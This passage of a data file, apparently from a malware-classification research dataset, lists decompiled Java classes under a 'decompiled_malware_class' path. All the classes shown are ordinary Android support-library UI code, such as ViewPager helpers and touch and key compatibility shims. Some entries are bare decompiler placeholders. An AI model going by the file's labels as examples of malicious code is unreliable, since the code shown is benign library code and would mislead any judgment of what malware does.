KeyEventCompatHoneycomb.metaStateHasModifiers(metaState,modifiers);     }     @Override public boolean metaStateHasNoModifiers(    int metaState){       return KeyEventCompatHoneycomb.metaStateHasNoModifiers(metaState);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombKeyEventVersionImpl();     }  else {       IMPL=new BaseKeyEventVersionImpl();     }   }   public static int normalizeMetaState(  int metaState){     return IMPL.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return IMPL.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return IMPL.metaStateHasNoModifiers(metaState);   }   public static boolean hasModifiers(  KeyEvent event,  int modifiers){     return IMPL.metaStateHasModifiers(event.getMetaState(),modifiers);   }   public static boolean hasNoModifiers(  KeyEvent event){     return IMPL.metaStateHasNoModifiers(event.getMetaState());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\KeyEventCompatHoneycomb.code","class KeyEventCompatHoneycomb {   KeyEventCompatHoneycomb(){   }   public static int normalizeMetaState(  int metaState){     return KeyEvent.normalizeMetaState(metaState);   }   public static boolean metaStateHasModifiers(  int metaState,  int modifiers){     return KeyEvent.metaStateHasModifiers(metaState,modifiers);   }   public static boolean metaStateHasNoModifiers(  int metaState){     return KeyEvent.metaStateHasNoModifiers(metaState);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\KeyEventVersionImpl.code","interface KeyEventVersionImpl {   boolean metaStateHasModifiers(  int i,  int i2);   boolean metaStateHasNoModifiers(  int i);   int normalizeMetaState(  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\LayoutParams.code","public static class LayoutParams extends ViewGroup.LayoutParams {   public int gravity;   public boolean isDecor;   public boolean needsMeasure;   public float widthFactor;   public LayoutParams(){     super(-1,-1);     this.widthFactor=0.0f;   }   public LayoutParams(  Context context,  AttributeSet attrs){     super(context,attrs);     this.widthFactor=0.0f;     TypedArray a=context.obtainStyledAttributes(attrs,ViewPager.LAYOUT_ATTRS);     this.gravity=a.getInteger(0,48);     a.recycle();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MenuCompat.code","public class MenuCompat {   static final MenuVersionImpl IMPL; interface MenuVersionImpl {     boolean setShowAsAction(    MenuItem menuItem,    int i);   } static class BaseMenuVersionImpl implements MenuVersionImpl {     BaseMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       return false;     }   } static class HoneycombMenuVersionImpl implements MenuVersionImpl {     HoneycombMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);       return true;     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombMenuVersionImpl();     }  else {       IMPL=new BaseMenuVersionImpl();     }   }   public static boolean setShowAsAction(  MenuItem item,  int actionEnum){     return IMPL.setShowAsAction(item,actionEnum);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MenuItemCompat.code","public class MenuItemCompat {   static final MenuVersionImpl IMPL;   public static final int SHOW_AS_ACTION_ALWAYS=2;   public static final int SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW=8;   public static final int SHOW_AS_ACTION_IF_ROOM=1;   public static final int SHOW_AS_ACTION_NEVER=0;   public static final int SHOW_AS_ACTION_WITH_TEXT=4; interface MenuVersionImpl {     MenuItem setActionView(    MenuItem menuItem,    View view);     boolean setShowAsAction(    MenuItem menuItem,    int i);   } static class BaseMenuVersionImpl implements MenuVersionImpl {     BaseMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       return false;     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return item;     }   } static class HoneycombMenuVersionImpl implements MenuVersionImpl {     HoneycombMenuVersionImpl(){     }     @Override public boolean setShowAsAction(    MenuItem item,    int actionEnum){       MenuItemCompatHoneycomb.setShowAsAction(item,actionEnum);       return true;     }     @Override public MenuItem setActionView(    MenuItem item,    View view){       return MenuItemCompatHoneycomb.setActionView(item,view);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombMenuVersionImpl();     }  else {       IMPL=new BaseMenuVersionImpl();     }   }   public static boolean setShowAsAction(  MenuItem item,  int actionEnum){     return IMPL.setShowAsAction(item,actionEnum);   }   public static MenuItem setActionView(  MenuItem item,  View view){     return IMPL.setActionView(item,view);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MenuItemCompatHoneycomb.code","class MenuItemCompatHoneycomb {   MenuItemCompatHoneycomb(){   }   public static void setShowAsAction(  MenuItem item,  int actionEnum){     item.setShowAsAction(actionEnum);   }   public static MenuItem setActionView(  MenuItem item,  View view){     return item.setActionView(view);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MenuVersionImpl.code","interface MenuVersionImpl {   boolean setShowAsAction(  MenuItem menuItem,  int i); } interface MenuVersionImpl {   MenuItem setActionView(  MenuItem menuItem,  View view);   boolean setShowAsAction(  MenuItem menuItem,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MotionEventCompat.code","public class MotionEventCompat {   public static final int ACTION_HOVER_ENTER=9;   public static final int ACTION_HOVER_EXIT=10;   public static final int ACTION_HOVER_MOVE=7;   public static final int ACTION_MASK=255;   public static final int ACTION_POINTER_DOWN=5;   public static final int ACTION_POINTER_INDEX_MASK=65280;   public static final int ACTION_POINTER_INDEX_SHIFT=8;   public static final int ACTION_POINTER_UP=6;   public static final int ACTION_SCROLL=8;   static final MotionEventVersionImpl IMPL; interface MotionEventVersionImpl {     int findPointerIndex(    MotionEvent motionEvent,    int i);     int getPointerId(    MotionEvent motionEvent,    int i);     float getX(    MotionEvent motionEvent,    int i);     float getY(    MotionEvent motionEvent,    int i);   } static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {     BaseMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return pointerId == 0 ? 0 : -1;     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       if (pointerIndex == 0) {         return event.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }   } static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {     EclairMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent event,    int pointerId){       return MotionEventCompatEclair.findPointerIndex(event,pointerId);     }     @Override public int getPointerId(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getPointerId(event,pointerIndex);     }     @Override public float getX(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getX(event,pointerIndex);     }     @Override public float getY(    MotionEvent event,    int pointerIndex){       return MotionEventCompatEclair.getY(event,pointerIndex);     }   } static {     if (Build.VERSION.SDK_INT >= 5) {       IMPL=new EclairMotionEventVersionImpl();     }  else {       IMPL=new BaseMotionEventVersionImpl();     }   }   public static int getActionMasked(  MotionEvent event){     return event.getAction() & ACTION_MASK;   }   public static int getActionIndex(  MotionEvent event){     return (event.getAction() & ACTION_POINTER_INDEX_MASK) >> 8;   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return IMPL.findPointerIndex(event,pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return IMPL.getPointerId(event,pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return IMPL.getX(event,pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return IMPL.getY(event,pointerIndex);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MotionEventCompatEclair.code","class MotionEventCompatEclair {   MotionEventCompatEclair(){   }   public static int findPointerIndex(  MotionEvent event,  int pointerId){     return event.findPointerIndex(pointerId);   }   public static int getPointerId(  MotionEvent event,  int pointerIndex){     return event.getPointerId(pointerIndex);   }   public static float getX(  MotionEvent event,  int pointerIndex){     return event.getX(pointerIndex);   }   public static float getY(  MotionEvent event,  int pointerIndex){     return event.getY(pointerIndex);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MotionEventVersionImpl.code","interface MotionEventVersionImpl {   int findPointerIndex(  MotionEvent motionEvent,  int i);   int getPointerId(  MotionEvent motionEvent,  int i);   float getX(  MotionEvent motionEvent,  int i);   float getY(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\MyAccessibilityDelegate.code","!org.eclipse.jdt.core.dom.TypeDeclaration@63c274b4"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\OnAdapterChangeListener.code","interface OnAdapterChangeListener {   void onAdapterChanged(  PagerAdapter pagerAdapter,  PagerAdapter pagerAdapter2); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\OnPageChangeListener.code","public interface OnPageChangeListener {   void onPageScrollStateChanged(  int i);   void onPageScrolled(  int i,  float f,  int i2);   void onPageSelected(  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PageListener.code","public class PageListener extends DataSetObserver implements ViewPager.OnPageChangeListener, ViewPager.OnAdapterChangeListener {   private int mScrollState;   private PageListener(){   }   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){     if (positionOffset > 0.5f) {       position++;     }     PagerTitleStrip.this.updateTextPositions(position,positionOffset,false);   }   @Override public void onPageSelected(  int position){     if (this.mScrollState == 0) {       PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());     }   }   @Override public void onPageScrollStateChanged(  int state){     this.mScrollState=state;   }   @Override public void onAdapterChanged(  PagerAdapter oldAdapter,  PagerAdapter newAdapter){     PagerTitleStrip.this.updateAdapter(oldAdapter,newAdapter);   }   @Override public void onChanged(){     PagerTitleStrip.this.updateText(PagerTitleStrip.this.mPager.getCurrentItem(),PagerTitleStrip.this.mPager.getAdapter());   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerAdapter.code","public abstract class PagerAdapter {   public static final int POSITION_NONE=-2;   public static final int POSITION_UNCHANGED=-1;   private DataSetObservable mObservable=new DataSetObservable();   public abstract int getCount();   public abstract boolean isViewFromObject(  View view,  Object obj);   public void startUpdate(  ViewGroup container){     startUpdate((View)container);   }   public Object instantiateItem(  ViewGroup container,  int position){     return instantiateItem((View)container,position);   }   public void destroyItem(  ViewGroup container,  int position,  Object object){     destroyItem((View)container,position,object);   }   public void setPrimaryItem(  ViewGroup container,  int position,  Object object){     setPrimaryItem((View)container,position,object);   }   public void finishUpdate(  ViewGroup container){     finishUpdate((View)container);   }   public void startUpdate(  View container){   }   public Object instantiateItem(  View container,  int position){     throw new UnsupportedOperationException(""Required method instantiateItem was not overridden"");   }   public void destroyItem(  View container,  int position,  Object object){     throw new UnsupportedOperationException(""Required method destroyItem was not overridden"");   }   public void setPrimaryItem(  View container,  int position,  Object object){   }   public void finishUpdate(  View container){   }   public Parcelable saveState(){     return null;   }   public void restoreState(  Parcelable state,  ClassLoader loader){   }   public int getItemPosition(  Object object){     return -1;   }   public void notifyDataSetChanged(){     this.mObservable.notifyChanged();   }   public void registerDataSetObserver(  DataSetObserver observer){     this.mObservable.registerObserver(observer);   }   public void unregisterDataSetObserver(  DataSetObserver observer){     this.mObservable.unregisterObserver(observer);   }   public CharSequence getPageTitle(  int position){     return null;   }   public float getPageWidth(  int position){     return 1.0f;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerObserver.code","private class PagerObserver extends DataSetObserver {   private PagerObserver(){   }   @Override public void onChanged(){     ViewPager.this.dataSetChanged();   }   @Override public void onInvalidated(){     ViewPager.this.dataSetChanged();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerTabStrip.code","public class PagerTabStrip extends PagerTitleStrip {   private static final int FULL_UNDERLINE_HEIGHT=1;   private static final int INDICATOR_HEIGHT=3;   private static final int MIN_PADDING_BOTTOM=6;   private static final int MIN_STRIP_HEIGHT=32;   private static final int MIN_TEXT_SPACING=64;   private static final int TAB_PADDING=16;   private static final int TAB_SPACING=32;   private static final String TAG=""PagerTabStrip"";   private boolean mDrawFullUnderline;   private boolean mDrawFullUnderlineSet;   private int mFullUnderlineHeight;   private boolean mIgnoreTap;   private int mIndicatorColor;   private int mIndicatorHeight;   private float mInitialMotionX;   private float mInitialMotionY;   private int mMinPaddingBottom;   private int mMinStripHeight;   private int mMinTextSpacing;   private int mTabAlpha;   private int mTabPadding;   private final Paint mTabPaint;   private final Rect mTempRect;   private int mTouchSlop;   public PagerTabStrip(  Context context){     this(context,null);   }   public PagerTabStrip(  Context context,  AttributeSet attrs){     super(context,attrs);     this.mTabPaint=new Paint();     this.mTempRect=new Rect();     this.mTabAlpha=MotionEventCompat.ACTION_MASK;     this.mDrawFullUnderline=false;     this.mDrawFullUnderlineSet=false;     this.mIndicatorColor=this.mTextColor;     this.mTabPaint.setColor(this.mIndicatorColor);     float density=context.getResources().getDisplayMetrics().density;     this.mIndicatorHeight=(int)((3.0f * density) + 0.5f);     this.mMinPaddingBottom=(int)((6.0f * density) + 0.5f);     this.mMinTextSpacing=(int)(64.0f * density);     this.mTabPadding=(int)((16.0f * density) + 0.5f);     this.mFullUnderlineHeight=(int)((1.0f * density) + 0.5f);     this.mMinStripHeight=(int)((32.0f * density) + 0.5f);     this.mTouchSlop=ViewConfiguration.get(context).getScaledTouchSlop();     setPadding(getPaddingLeft(),getPaddingTop(),getPaddingRight(),getPaddingBottom());     setTextSpacing(getTextSpacing());     setWillNotDraw(false);     this.mPrevText.setFocusable(true);     this.mPrevText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() - 1);       }     } );     this.mNextText.setFocusable(true);     this.mNextText.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View v){         PagerTabStrip.this.mPager.setCurrentItem(PagerTabStrip.this.mPager.getCurrentItem() + 1);       }     } );     if (getBackground() == null) {       this.mDrawFullUnderline=true;     }   }   public void setTabIndicatorColor(  int color){     this.mIndicatorColor=color;     this.mTabPaint.setColor(this.mIndicatorColor);     invalidate();   }   public void setTabIndicatorColorResource(  int resId){     setTabIndicatorColor(getContext().getResources().getColor(resId));   }   public int getTabIndicatorColor(){     return this.mIndicatorColor;   }   @Override public void setPadding(  int left,  int top,  int right,  int bottom){     if (bottom < this.mMinPaddingBottom) {       bottom=this.mMinPaddingBottom;     }     super.setPadding(left,top,right,bottom);   }   @Override public void setTextSpacing(  int textSpacing){     if (textSpacing < this.mMinTextSpacing) {       textSpacing=this.mMinTextSpacing;     }     super.setTextSpacing(textSpacing);   }   @Override public void setBackgroundDrawable(  Drawable d){     super.setBackgroundDrawable(d);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=d == null;     }   }   @Override public void setBackgroundColor(  int color){     super.setBackgroundColor(color);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=((-16777216) & color) == 0;     }   }   @Override public void setBackgroundResource(  int resId){     super.setBackgroundResource(resId);     if (!this.mDrawFullUnderlineSet) {       this.mDrawFullUnderline=resId == 0;     }   }   public void setDrawFullUnderline(  boolean drawFull){     this.mDrawFullUnderline=drawFull;     this.mDrawFullUnderlineSet=true;     invalidate();   }   public boolean getDrawFullUnderline(){     return this.mDrawFullUnderline;   }   @Override public int getMinHeight(){     return Math.max(super.getMinHeight(),this.mMinStripHeight);   }   @Override public boolean onTouchEvent(  MotionEvent ev){     int action=ev.getAction();     if (action != 0 && this.mIgnoreTap) {       return false;     }     float x=ev.getX();     float y=ev.getY(); switch (action) { case 0:       this.mInitialMotionX=x;     this.mInitialMotionY=y;   this.mIgnoreTap=false; break; case 1: if (x >= this.mCurrText.getLeft() - this.mTabPadding) { if (x > this.mCurrText.getRight() + this.mTabPadding) {   this.mPager.setCurrentItem(this.mPager.getCurrentItem() + 1);   break; } }  else { this.mPager.setCurrentItem(this.mPager.getCurrentItem() - 1); break; } break; case 2: if (Math.abs(x - this.mInitialMotionX) > this.mTouchSlop || Math.abs(y - this.mInitialMotionY) > this.mTouchSlop) { this.mIgnoreTap=true; break; } break; } return true; } @Override protected void onDraw(Canvas canvas){ super.onDraw(canvas); int height=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=height - this.mIndicatorHeight; this.mTabPaint.setColor((this.mTabAlpha << 24) | (this.mIndicatorColor & 16777215)); canvas.drawRect(left,top,right,height,this.mTabPaint); if (this.mDrawFullUnderline) { this.mTabPaint.setColor((-16777216) | (this.mIndicatorColor & 16777215)); canvas.drawRect(0.0f,height - this.mFullUnderlineHeight,getWidth(),height,this.mTabPaint); } } @Override public void updateTextPositions(int position,float positionOffset,boolean force){ Rect r=this.mTempRect; int bottom=getHeight(); int left=this.mCurrText.getLeft() - this.mTabPadding; int right=this.mCurrText.getRight() + this.mTabPadding; int top=bottom - this.mIndicatorHeight; r.set(left,top,right,bottom); super.updateTextPositions(position,positionOffset,force); this.mTabAlpha=(int)(Math.abs(positionOffset - 0.5f) * 2.0f * 255.0f); int left2=this.mCurrText.getLeft() - this.mTabPadding; int right2=this.mCurrText.getRight() + this.mTabPadding; r.union(left2,top,right2,bottom); invalidate(r); } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerTitleStrip.code","!org.eclipse.jdt.core.dom.TypeDeclaration@34337ea7"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerTitleStripIcs.code","class PagerTitleStripIcs {   PagerTitleStripIcs(){   }   public static void setSingleLineAllCaps(  TextView text){     text.setTransformationMethod(new SingleLineAllCapsTransform(text.getContext()));   } private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {     private static final String TAG=""SingleLineAllCapsTransform"";     private Locale mLocale;     public SingleLineAllCapsTransform(    Context context){       this.mLocale=context.getResources().getConfiguration().locale;     }     @Override public CharSequence getTransformation(    CharSequence source,    View view){       CharSequence source2=super.getTransformation(source,view);       if (source2 != null) {         return source2.toString().toUpperCase(this.mLocale);       }       return null;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerTitleStripImpl.code","public interface PagerTitleStripImpl {   void setSingleLineAllCaps(  TextView textView); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerTitleStripImplBase.code","static class PagerTitleStripImplBase implements PagerTitleStripImpl {   PagerTitleStripImplBase(){   }   @Override public void setSingleLineAllCaps(  TextView text){     text.setSingleLine();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\PagerTitleStripImplIcs.code","static class PagerTitleStripImplIcs implements PagerTitleStripImpl {   PagerTitleStripImplIcs(){   }   @Override public void setSingleLineAllCaps(  TextView text){     PagerTitleStripIcs.setSingleLineAllCaps(text);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\SavedState.code","public static class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=ParcelableCompat.newCreator(new ParcelableCompatCreatorCallbacks<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in,    ClassLoader loader){       return new SavedState(in,loader);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } );   Parcelable adapterState;   ClassLoader loader;   int position;   public SavedState(  Parcelable superState){     super(superState);   }   @Override public void writeToParcel(  Parcel out,  int flags){     super.writeToParcel(out,flags);     out.writeInt(this.position);     out.writeParcelable(this.adapterState,flags);   }   public String toString(){     return ""FragmentPager.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" position=""+ this.position+ ""}"";   }   SavedState(  Parcel in,  ClassLoader loader){     super(in);     loader=loader == null ? getClass().getClassLoader() : loader;     this.position=in.readInt();     this.adapterState=in.readParcelable(loader);     this.loader=loader;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\SimpleOnPageChangeListener.code","public static class SimpleOnPageChangeListener implements OnPageChangeListener {   @Override public void onPageScrolled(  int position,  float positionOffset,  int positionOffsetPixels){   }   @Override public void onPageSelected(  int position){   }   @Override public void onPageScrollStateChanged(  int state){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\SingleLineAllCapsTransform.code","private static class SingleLineAllCapsTransform extends SingleLineTransformationMethod {   private static final String TAG=""SingleLineAllCapsTransform"";   private Locale mLocale;   public SingleLineAllCapsTransform(  Context context){     this.mLocale=context.getResources().getConfiguration().locale;   }   @Override public CharSequence getTransformation(  CharSequence source,  View view){     CharSequence source2=super.getTransformation(source,view);     if (source2 != null) {       return source2.toString().toUpperCase(this.mLocale);     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\VelocityTrackerCompat.code","public class VelocityTrackerCompat {   static final VelocityTrackerVersionImpl IMPL; interface VelocityTrackerVersionImpl {     float getXVelocity(    VelocityTracker velocityTracker,    int i);     float getYVelocity(    VelocityTracker velocityTracker,    int i);   } static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     BaseVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getXVelocity();     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return tracker.getYVelocity();     }   } static class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     HoneycombVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getXVelocity(tracker,pointerId);     }     @Override public float getYVelocity(    VelocityTracker tracker,    int pointerId){       return VelocityTrackerCompatHoneycomb.getYVelocity(tracker,pointerId);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombVelocityTrackerVersionImpl();     }  else {       IMPL=new BaseVelocityTrackerVersionImpl();     }   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getXVelocity(tracker,pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return IMPL.getYVelocity(tracker,pointerId);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\VelocityTrackerCompatHoneycomb.code","class VelocityTrackerCompatHoneycomb {   VelocityTrackerCompatHoneycomb(){   }   public static float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity(pointerId);   }   public static float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity(pointerId);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\VelocityTrackerVersionImpl.code","interface VelocityTrackerVersionImpl {   float getXVelocity(  VelocityTracker velocityTracker,  int i);   float getYVelocity(  VelocityTracker velocityTracker,  int i); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view\ViewCompat.code","public class ViewCompat {   private static final long FAKE_FRAME_TIME=10;   static final ViewCompatImpl IMPL;   public static final int IMPORTANT_FOR_ACCESSIBILITY_AUTO=0;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO=2;   public static final int IMPORTANT_FOR_ACCESSIBILITY_YES=1;   public static final int OVER_SCROLL_ALWAYS=0;   public static final int OVER_SCROLL_IF_CONTENT_SCROLLS=1;   public static final int OVER_SCROLL_NEVER=2; interface ViewCompatImpl {     boolean canScrollHorizontally(    View view,    int i);     boolean canScrollVertically(    View view,    int i);     AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view);     int getImportantForAccessibility(    View view);     int getOverScrollMode(    View view);     boolean hasTransientState(    View view);     void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);     void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent);     void postInvalidateOnAnimation(    View view);     void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4);     void postOnAnimation(    View view,    Runnable runnable);     void postOnAnimationDelayed(    View view,    Runnable runnable,    long j);     void setAccessibilityDelegate(    View view,    AccessibilityDelegateCompat accessibilityDelegateCompat);     void setHasTransientState(    View view,    boolean z);     void setImportantForAccessibility(    View view,    int i);     void setOverScrollMode(    View view,    int i);   } static class BaseViewCompatImpl implements ViewCompatImpl {     BaseViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return false;     }     @Override public boolean canScrollVertically(    View v,    int direction){       return false;     }     @Override public int getOverScrollMode(    View v){       return 2;     }     @Override public void setOverScrollMode(    View v,    int mode){     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){     }     @Override public boolean hasTransientState(    View view){       return false;     }     @Override public void setHasTransientState(    View view,    boolean hasTransientState){     }     @Override public void postInvalidateOnAnimation(    View view){       view.postInvalidateDelayed(getFrameTime());     }     @Override public void postInvalidateOnAnimation(    View view,    int left,    int top,    int right,    int bottom){       view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);     }     @Override public void postOnAnimation(    View view,    Runnable action){       view.postDelayed(action,getFrameTime());     }     @Override public void postOnAnimationDelayed(    View view,    Runnable action,    long delayMillis){       view.postDelayed(action,getFrameTime() + delayMillis);     }     long getFrameTime(){       return ViewCompat.FAKE_FRAME_TIME;     }     @Override public int getImportantForAccessibility(    View view){       return 0;     }     @Override public void setImportantForAccessibility(    View view,    int mode){     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       return null;     }   } static class GBViewCompatImpl extends BaseViewCompatImpl {     GBViewCompatImpl(){     }     @Override public int getOverScrollMode(    View v){       return ViewCompatGingerbread.getOverScrollMode(v);     }     @Override public void setOverScrollMode(    View v,    int mode){       ViewCompatGingerbread.setOverScrollMode(v,mode);     }   } static class HCViewCompatImpl extends GBViewCompatImpl {     HCViewCompatImpl(){     }     @Override long getFrameTime(){       return ViewCompatHC.getFrameTime();     }   } static class ICSViewCompatImpl extends HCViewCompatImpl {     ICSViewCompatImpl(){     }     @Override public boolean canScrollHorizontally(    View v,    int direction){       return ViewCompatICS.canScrollHorizontally(v,direction);     }     @Override public boolean canScrollVertically(    View v,    int direction){       return ViewCompatICS.canScrollVertically(v,direction);     }     @Override public void onPopulateAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onPopulateAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityEvent(    View v,    AccessibilityEvent event){       ViewCompatICS.onInitializeAccessibilityEvent(v,event);     }     @Override public void onInitializeAccessibilityNodeInfo(    View v,    AccessibilityNodeInfoCompat info){       ViewCompatICS.onInitializeAccessibilityNodeInfo(v,info.getInfo());     }     @Override public void setAccessibilityDelegate(    View v,    AccessibilityDelegateCompat delegate){       ViewCompatICS.setAccessibilityDelegate(v,delegate.getBridge());     }   } static class 